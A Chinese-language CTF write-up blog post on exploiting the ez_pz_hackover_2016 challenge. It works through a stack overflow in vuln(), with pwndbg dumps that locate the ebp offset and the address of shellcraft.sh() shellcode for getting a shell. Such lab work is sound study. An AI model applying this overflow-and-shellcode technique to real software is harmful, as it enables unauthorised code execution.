+++
title = "wp"
date = "2026-04-15"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
![Pasted image 20260304083956.png](%E9%99%84%E4%BB%B6/Pasted%20image%2020260304083956.png)
我们输入的是s
chall函数里有这么一段，s要包含crashme就能通过这里的的判断。
```c
 fgets(s, 1023, stdin);
  n = strlen(s);
  v3 = memchr(s, 10, n);
  if ( v3 )
    *v3 = 0;
  printf("\nWelcome %s!\n", s);
```
寻找‘/n’，memchr是从s开始在往后n个字节里寻找‘/n’，将‘/n’替换成‘/0’。n是输入的s的字符数。这个操作就是删掉所有的‘/n’，替换成‘/0’。
后续将0x400的字符传入vuln
![Pasted image 20260304085031.png](%E9%99%84%E4%BB%B6/Pasted%20image%2020260304085031.png)
再将传入的字符复制到dest中。dest的大小是0x32
这里可以构造栈溢出。
文件里有printf，可以用这个进行ret2libc
网上的wp说dest实际上是16个字节，
```bash
pwndbg> i r
eax            0xffffc5e6          -14874
ecx            0x0                 0
edx            0xffffc9e6          -13850
ebx            0xf7f9fe14          -134611436
esp            0xffffc5e0          0xffffc5e0
ebp            0xffffc618          0xffffc618
esi            0x8048720           134514464
edi            0xf7ffcb60          -134231200
eip            0x8048600           0x8048600 <vuln+28>
eflags         0x282               [ SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
k0             0x0                 0
k1             0x0                 0
k2             0x0                 0
k3             0x0                 0
k4             0x0                 0
k5             0x0                 0
k6             0x0                 0
k7             0x0                 0
pwndbg> search crashme
Searching for byte: b'crashme'
ez_pz_hackover_2016 0x8048853 arpl word ptr [edx + 0x61], si /* 'crashme' */
ez_pz_hackover_2016 0x8049853 'crashme'
[heap]          0x804b1a0 'crashme\n'
[stack]         0xffffc565 0x73617263 ('cras')
[stack]         0xffffc602 'crashme'
```
这里可以看到我们输入的crashme在0xffffc602
ebp在0xffffc618，确实是0x16 。
第一次的脚本exp1
最后的shellcode用：shellcode=asm(shellcraft.sh())
s的开头：![Pasted image 20260304175610.png](%E9%99%84%E4%BB%B6/Pasted%20image%2020260304175610.png)
我们去找/bin/sh

对于shellcode的生成请参考ai大佬生成的文章Shellcode 生成规则与 Pwndbg 动态调试
在这里我们调试后可以看到栈上的内容
```bash
00:0000│ esp   0xfffd7820 ◂— 1
01:0004│ eax-2 0xfffd7824 ◂— 0x787c788c
02:0008│-030   0xfffd7828 ◂— 0x400fffd
03:000c│-02c   0xfffd782c ◂— 0x70000
04:0010│-028   0xfffd7830 ◂— 0xe79e0000
05:0014│-024   0xfffd7834 ◂— 0xf7ef
06:0018│-020   0xfffd7838 ◂— 0x78dc0000
07:001c│-01c   0xfffd783c ◂— 0x8b8cfffd
08:0020│-018   0xfffd7840 ◂— 0x7263f7f2
09:0024│-014   0xfffd7844 ◂— 'ashme'
0a:0028│-010   0xfffd7848 ◂— 0x61610065 /* 'e' */
0b:002c│-00c   0xfffd784c ◂— 'aaaaaaaaaaaaaaaa'
... ↓          2 skipped
0e:0038│ ebp   0xfffd7858 ◂— 'aaaa'
0f:003c│+004   0xfffd785c ◂— 0
10:0040│+008   0xfffd7860 ◂— 0x2f68686a ('jhh/')
11:0044│+00c   0xfffd7864 ◂— 0x68732f2f ('//sh')
12:0048│+010   0xfffd7868 ◂— 0x6e69622f ('/bin')
13:004c│+014   0xfffd786c ◂— 0x168e389
14:0050│+018   0xfffd7870 ◂— 0x81010101
```
0xfffd7860是shellcode的起始地址
![Pasted image 20260304183525.png](%E9%99%84%E4%BB%B6/Pasted%20image%2020260304183525.png)是s的起始地址。两者相差0x1c，也就是shellcode的位置在 ==s_addr - 0x1c== 
将其写到脚本中得到最终的expexp2
